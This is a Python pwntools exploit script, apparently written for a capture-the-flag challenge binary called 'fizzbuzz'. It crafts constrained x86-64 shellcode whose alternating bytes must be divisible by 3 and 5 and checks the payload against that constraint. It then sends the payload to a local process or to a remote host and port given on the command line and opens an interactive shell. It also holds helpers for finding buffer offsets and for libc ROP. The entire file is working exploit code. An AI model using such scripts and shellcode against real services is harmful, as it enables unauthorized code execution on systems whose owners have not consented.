#!/usr/bin/python3

from pwn import *
import sys
from ctypes import CDLL

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./fizzbuzz"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
break *main+406
'''

libcx = CDLL("libc.so.6")
# now = int(floor(time.time()))
# libcx.srand(now)
# print(libcx.rand())

def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def unpack_ptr(ptr):
    if (len(ptr) < 8):
        ptr += (8 - len(ptr)) * b"\x00"
    return (u64(ptr))

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def pass_tests(shellcode):
    x = False
    for p in shellcode:
        if (x == False ):
            x = True
            if (p % 3 != 0):
                return (False)
        else :
            x = False
            if (p % 5 != 0):
                return (False)
    return (True);

def exploit():
    binsh =  "inc rsi;fs;" * 30
    log.info("binary loaded")
    pp.recvuntil(b">> ")
    payload = asm(
        "nop;"
        "cpuid;"        # zero out  rax and all other regs
        "fs;"           # blocking the shit
        "dec rdi;fs;"
        "inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;inc rsi;fs;"
    'inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;inc rax;fs;' # setting the syscall
        "syscall;"
        )
    x = pass_tests(payload)
    if (x == True):
        log.success("tests passed shell code is gonna work")
    else:
        log.error("tests are failing review your shellcode")
    pp.sendline(payload)
    pp.interactive()
    

if (args.REMOTE):
    libc = ELF("/usr/lib/libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
